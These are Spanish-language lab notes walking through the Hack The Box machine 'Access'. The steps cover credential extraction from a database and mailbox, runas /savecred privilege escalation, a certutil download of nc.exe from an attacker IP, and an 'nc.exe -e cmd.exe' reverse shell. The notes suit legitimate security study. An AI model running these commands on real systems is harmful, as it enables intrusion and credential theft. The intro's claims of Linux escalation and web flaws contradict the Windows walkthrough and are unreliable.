-- -
- Tags: #ejptmachine #runas #telnet #certutil
--- -
### ¿Qué habilidades puedes practicar con Access?

1. **Reconocimiento y escaneo de puertos:**
    - Al igual que en la mayoría de las máquinas de Hack The Box, el primer paso es realizar un **escaneo de puertos** para identificar los servicios y puertos abiertos. Utilizando herramientas como **Nmap** podrás obtener una visión clara de los servicios disponibles, lo que te permitirá planificar tu ataque.
2. **Explotación de vulnerabilidades web:**
    - En **Access**, uno de los principales vectores de ataque es una vulnerabilidad en una aplicación web. Deberás realizar un **reconocimiento web** exhaustivo para identificar posibles **vulnerabilidades** como **inyección SQL (SQLi)**, **cross-site scripting (XSS)**, o **autenticación débil**.
    - Este tipo de vulnerabilidad te permitirá obtener acceso al sistema o **obtener credenciales** que te ayuden en etapas posteriores del proceso.
3. **Escalada de privilegios en Linux:**
    - Una vez que consigas acceso inicial al sistema, tendrás que realizar una **escalada de privilegios** para obtener privilegios más altos en el sistema **Linux**. Buscarás **permisos incorrectos** en archivos importantes o configuraciones erróneas en servicios que puedan permitirte elevar tus privilegios.
    - También es común que se necesite **abuso de configuraciones de Sudo** o el aprovechamiento de **vulnerabilidades locales** para lograr la escalada.

----

https://www.youtube.com/watch?v=rbJGPEppbV0&ab_channel=xerosec

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.98`

![Pasted image 20241207172420](../../Fotos/Pasted%20image%2020241207172420.png)

Dentro de Backups

![Pasted image 20241207173630](../../Fotos/Pasted%20image%2020241207173630.png)

![Pasted image 20241207173749](../../Fotos/Pasted%20image%2020241207173749.png)

Dentro de Enginer

![Pasted image 20241207173854](../../Fotos/Pasted%20image%2020241207173854.png)

Vemos las tablas
![Pasted image 20241207183207](../../Fotos/Pasted%20image%2020241207183207.png)

Vemos las tablas que tienen posiblemente credenciales

![Pasted image 20241207183010](../../Fotos/Pasted%20image%2020241207183010.png)

![Pasted image 20241207183159](../../Fotos/Pasted%20image%2020241207183159.png)

`7z x Access\ Control.zip -paccess4u@security`
Utilizaremos las credenciales obtenidas para descomprimir acceso control que estaba en enginer

![Pasted image 20241207183504](../../Fotos/Pasted%20image%2020241207183504.png)

![Pasted image 20241207183623](../../Fotos/Pasted%20image%2020241207183623.png)

`readpst Access\ Control.pst`

![Pasted image 20241207184238](../../Fotos/Pasted%20image%2020241207184238.png)

`cat Access\ Control.mbox`
![Pasted image 20241207184448](../../Fotos/Pasted%20image%2020241207184448.png)

security
4Cc3ssC0ntr0ller

![Pasted image 20241207184656](../../Fotos/Pasted%20image%2020241207184656.png)

![Pasted image 20241207184858](../../Fotos/Pasted%20image%2020241207184858.png)

user flag: 54720bd41356f5bc363c14c90d718efc

`Maquina Vulnerada`

----

*Escalada de privilegios*

`cmdkey list `
-  Imprimirá información sobre las credenciales almacenadas disponibles para el usuario actual

![Pasted image 20241207191533](../../Fotos/Pasted%20image%2020241207191533.png)

`dir /a`
- Ver directorios ocultos en Windows.

![Pasted image 20241207191918](../../Fotos/Pasted%20image%2020241207191918.png)

![Pasted image 20241207192630](../../Fotos/Pasted%20image%2020241207192630.png)

- Sintaxis interesante

`C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe`

*Modificación de sintaxis*

`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\Desktop\root.txt"`

-  Ruta de runas en sistema que alude al acceso de administrator de un archivo que contiene las credenciales en /savecreed, tenemos que indicar que shell vamos a utilizar en este caso cmd.exe ya que estamos en windows y luego aludir a la ruta donde esta el archivo y donde queremos que quede que seria donde si tenemos acceso. el hacer esto no nos pediría contraseña ya que toma la contraseña que esta dentro de /savecreed directamente.

Antes de ejecutar el comando

![Pasted image 20241229143109](../../Fotos/Pasted%20image%2020241229143109.png)

Despues de ejecutar el comando con **runas**

![Pasted image 20241229143126](../../Fotos/Pasted%20image%2020241229143126.png)

![Pasted image 20241229143208](../../Fotos/Pasted%20image%2020241229143208.png)

`Maquina Vulnerada`

Root Flag: 503b7b920525bb82fb2671781f1555ac

*Tenemos la Flag de Root pero falta ser Root*

![Pasted image 20241229143441](../../Fotos/Pasted%20image%2020241229143441.png)

Montamos un servidor con python

![Pasted image 20241229143514](../../Fotos/Pasted%20image%2020241229143514.png)

- Todos los archivos de la carpeta access se estan sirviendo por el puerto 80 de la maquina access

Como trabajamos con el protocolo Telnet en el puerto 23 y windows lo que haremos sera cargar el nc.exe con:
`certutil -f -urlcache http://10.10.14.2/nc.exe nc.exe`

![Pasted image 20241229144342](../../Fotos/Pasted%20image%2020241229144342.png)

Reciclamos la sintaxis modificada pasada
`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\Desktop\root.txt"`

**Reverse shell con nc.exe**
`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "nc.exe -e cmd.exe 10.10.14.2 443"`

![Pasted image 20241229144742](../../Fotos/Pasted%20image%2020241229144742.png)

`Escalada de privilegios completa`

---

*Preguntas*

De esta forma podemos ver a que dirección apunta un archivo claramente leyendolo windows.

![Pasted image 20241207205314](../../Fotos/Pasted%20image%2020241207205314.png)

What Windows command, when given the `/list` option, will print information about the stored credentials available to the current user?
¿Qué comando de Windows, cuando se le da la opción /list, imprimirá información sobre las credenciales almacenadas disponibles para el usuario actual?
`cmdkey`

---

INVESTIGAR MAS SOBRE LAS RUNAS EN WINDOWS
